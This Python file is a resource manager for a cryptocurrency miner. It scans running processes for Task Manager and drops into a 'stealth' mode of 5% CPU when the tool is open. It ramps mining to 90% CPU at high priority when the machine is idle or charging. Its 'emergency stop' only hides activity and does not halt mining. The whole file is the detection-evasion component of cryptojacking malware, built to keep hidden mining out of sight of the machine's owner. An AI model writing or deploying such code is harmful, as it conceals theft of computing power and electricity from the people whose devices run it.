"""
Intelligent Resource Manager
Handles adaptive CPU usage, task manager detection, battery awareness, and resource optimization.
"""

import time
import threading
import psutil
import logging
from typing import Dict, Any, Optional
from enum import Enum

class ResourceMode(Enum):
    """Resource usage modes"""
    STEALTH = "stealth"           # Minimal usage when detected
    CONSERVATIVE = "conservative" # Low usage for battery
    BALANCED = "balanced"         # Normal usage
    AGGRESSIVE = "aggressive"     # High usage when optimal

class ResourceManager:
    """
    Intelligent resource manager that adapts mining intensity based on:
    - Task Manager detection
    - Battery status and charging
    - System idle time
    - System load
    - User activity
    """
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.logger = logging.getLogger(__name__)
        
        # Resource management settings
        self.resource_config = config.get('resource_management', {})
        self.charging_threshold = self.resource_config.get('charging_threshold', 90)
        self.idle_threshold = self.resource_config.get('idle_threshold', 300)
        self.battery_threshold = self.resource_config.get('battery_threshold', 25)
        self.task_manager_detection = self.resource_config.get('task_manager_detection', True)
        
        # Current state
        self.current_mode = ResourceMode.BALANCED
        self.running = False
        self.stealth_timer = None
        self.last_activity_check = time.time()
        
        # Threading
        self.management_thread = None
        self.stop_event = threading.Event()
        
        # Resource limits for each mode
        self.mode_limits = {
            ResourceMode.STEALTH: {
                'cpu_percent': 5,
                'cpu_threads': 1,
                'gpu_percent': 10,
                'priority': 'low'
            },
            ResourceMode.CONSERVATIVE: {
                'cpu_percent': 25,
                'cpu_threads': 2,
                'gpu_percent': 30,
                'priority': 'below_normal'
            },
            ResourceMode.BALANCED: {
                'cpu_percent': 60,
                'cpu_threads': 'auto',
                'gpu_percent': 70,
                'priority': 'normal'
            },
            ResourceMode.AGGRESSIVE: {
                'cpu_percent': 90,
                'cpu_threads': 'max',
                'gpu_percent': 95,
                'priority': 'high'
            }
        }
        
        self.logger.info("Resource Manager initialized")
    
    def start(self):
        """Start the resource manager"""
        if self.running:
            return
        
        self.logger.info("🚀 Starting Resource Manager...")
        self.running = True
        self.stop_event.clear()
        
        # Start management thread
        self.management_thread = threading.Thread(
            target=self._management_loop,
            daemon=True
        )
        self.management_thread.start()
        
        self.logger.info("✅ Resource Manager started")
    
    def stop(self):
        """Stop the resource manager"""
        if not self.running:
            return
        
        self.logger.info("🛑 Stopping Resource Manager...")
        self.running = False
        self.stop_event.set()
        
        if self.management_thread:
            self.management_thread.join(timeout=5)
        
        self.logger.info("✅ Resource Manager stopped")
    
    def set_stealth_mode(self):
        """Set stealth mode when Task Manager is detected"""
        if self.current_mode != ResourceMode.STEALTH:
            self.logger.info("🕵️ Switching to STEALTH mode")
            self.current_mode = ResourceMode.STEALTH
            
            # Set a timer to return to normal mode
            if self.stealth_timer:
                self.stealth_timer.cancel()
            
            self.stealth_timer = threading.Timer(30.0, self._exit_stealth_mode)
            self.stealth_timer.start()
    
    def set_conservative_mode(self):
        """Set conservative mode for battery saving"""
        if self.current_mode != ResourceMode.CONSERVATIVE:
            self.logger.info("🔋 Switching to CONSERVATIVE mode")
            self.current_mode = ResourceMode.CONSERVATIVE
    
    def set_balanced_mode(self):
        """Set balanced mode for normal operation"""
        if self.current_mode != ResourceMode.BALANCED:
            self.logger.info("⚖️ Switching to BALANCED mode")
            self.current_mode = ResourceMode.BALANCED
    
    def set_aggressive_mode(self):
        """Set aggressive mode for maximum mining"""
        if self.current_mode != ResourceMode.AGGRESSIVE:
            self.logger.info("🚀 Switching to AGGRESSIVE mode")
            self.current_mode = ResourceMode.AGGRESSIVE
    
    def get_current_mode(self) -> str:
        """Get current resource mode"""
        return self.current_mode.value
    
    def get_resource_limits(self) -> Dict[str, Any]:
        """Get current resource limits"""
        return self.mode_limits[self.current_mode].copy()
    
    def calculate_optimal_threads(self) -> int:
        """Calculate optimal number of CPU threads based on current mode"""
        cpu_count = psutil.cpu_count(logical=True)
        mode_config = self.mode_limits[self.current_mode]
        
        if mode_config['cpu_threads'] == 'auto':
            return max(1, cpu_count // 2)
        elif mode_config['cpu_threads'] == 'max':
            return cpu_count
        else:
            return min(mode_config['cpu_threads'], cpu_count)
    
    def should_throttle(self) -> bool:
        """Check if mining should be throttled"""
        # Check CPU temperature
        try:
            cpu_temp = self._get_cpu_temperature()
            if cpu_temp > 85:  # Celsius
                self.logger.warning(f"🔥 High CPU temperature: {cpu_temp}°C - throttling")
                return True
        except:
            pass
        
        # Check memory usage
        memory = psutil.virtual_memory()
        if memory.percent > 90:
            self.logger.warning(f"💾 High memory usage: {memory.percent}% - throttling")
            return True
        
        # Check disk space
        disk = psutil.disk_usage('/')
        if disk.percent > 95:
            self.logger.warning(f"💿 Low disk space: {disk.percent}% - throttling")
            return True
        
        return False
    
    def _management_loop(self):
        """Main resource management loop"""
        while self.running and not self.stop_event.is_set():
            try:
                # Check for task manager if enabled
                if self.task_manager_detection and self._is_task_manager_open():
                    self.set_stealth_mode()
                
                # Check battery status
                battery_info = self._get_battery_info()
                if battery_info['plugged']:
                    if battery_info['percent'] > self.charging_threshold:
                        self.set_aggressive_mode()
                    else:
                        self.set_balanced_mode()
                else:
                    if battery_info['percent'] < self.battery_threshold:
                        self.set_conservative_mode()
                    else:
                        self.set_balanced_mode()
                
                # Check idle time
                idle_time = self._get_idle_time()
                if idle_time > self.idle_threshold:
                    self.set_aggressive_mode()
                
                # Check system load
                system_load = psutil.cpu_percent(interval=1)
                if system_load > 80:
                    self.set_conservative_mode()
                
                # Apply resource limits
                self._apply_resource_limits()
                
                time.sleep(5)  # Check every 5 seconds
                
            except Exception as e:
                self.logger.error(f"Error in resource management loop: {e}")
                time.sleep(10)
    
    def _exit_stealth_mode(self):
        """Exit stealth mode after timer expires"""
        self.logger.info("🕵️ Exiting stealth mode")
        self.set_balanced_mode()
    
    def _is_task_manager_open(self) -> bool:
        """Check if Task Manager is currently open"""
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and 'taskmgr' in proc.info['name'].lower():
                    return True
            return False
        except:
            return False
    
    def _get_battery_info(self) -> Dict[str, Any]:
        """Get battery information"""
        try:
            battery = psutil.sensors_battery()
            if battery:
                return {
                    'plugged': battery.power_plugged,
                    'percent': battery.percent,
                    'time_left': battery.secsleft
                }
            else:
                return {'plugged': True, 'percent': 100, 'time_left': None}
        except:
            return {'plugged': True, 'percent': 100, 'time_left': None}
    
    def _get_idle_time(self) -> float:
        """Get system idle time in seconds"""
        try:
            # This is a simplified implementation
            # In a real implementation, you'd use platform-specific APIs
            return time.time() - self.last_activity_check
        except:
            return 0
    
    def _get_cpu_temperature(self) -> Optional[float]:
        """Get CPU temperature in Celsius"""
        try:
            # This is platform-specific and may not work on all systems
            # In a real implementation, you'd use proper temperature monitoring
            return None
        except:
            return None
    
    def _apply_resource_limits(self):
        """Apply current resource limits to the system"""
        try:
            limits = self.get_resource_limits()
            
            # Set process priority
            current_process = psutil.Process()
            if limits['priority'] == 'low':
                current_process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
            elif limits['priority'] == 'high':
                current_process.nice(psutil.HIGH_PRIORITY_CLASS)
            else:
                current_process.nice(psutil.NORMAL_PRIORITY_CLASS)
                
        except Exception as e:
            self.logger.error(f"Error applying resource limits: {e}")
    
    def update_config(self, new_config: Dict[str, Any]):
        """Update resource manager configuration"""
        self.config.update(new_config)
        self.resource_config = new_config.get('resource_management', {})
        self.charging_threshold = self.resource_config.get('charging_threshold', 90)
        self.idle_threshold = self.resource_config.get('idle_threshold', 300)
        self.battery_threshold = self.resource_config.get('battery_threshold', 25)
        self.task_manager_detection = self.resource_config.get('task_manager_detection', True)
        
        self.logger.info("Resource Manager configuration updated")
    
    def emergency_stop(self):
        """Emergency stop - immediately set to stealth mode"""
        self.logger.warning("🚨 Emergency stop - setting stealth mode")
        self.set_stealth_mode()
    
    def is_healthy(self) -> bool:
        """Check if resource manager is healthy"""
        return self.running and not self.stop_event.is_set()
    
    def get_status(self) -> Dict[str, Any]:
        """Get resource manager status"""
        return {
            'running': self.running,
            'current_mode': self.current_mode.value,
            'resource_limits': self.get_resource_limits(),
            'optimal_threads': self.calculate_optimal_threads(),
            'should_throttle': self.should_throttle(),
            'battery_info': self._get_battery_info(),
            'idle_time': self._get_idle_time(),
            'task_manager_detected': self._is_task_manager_open()
        }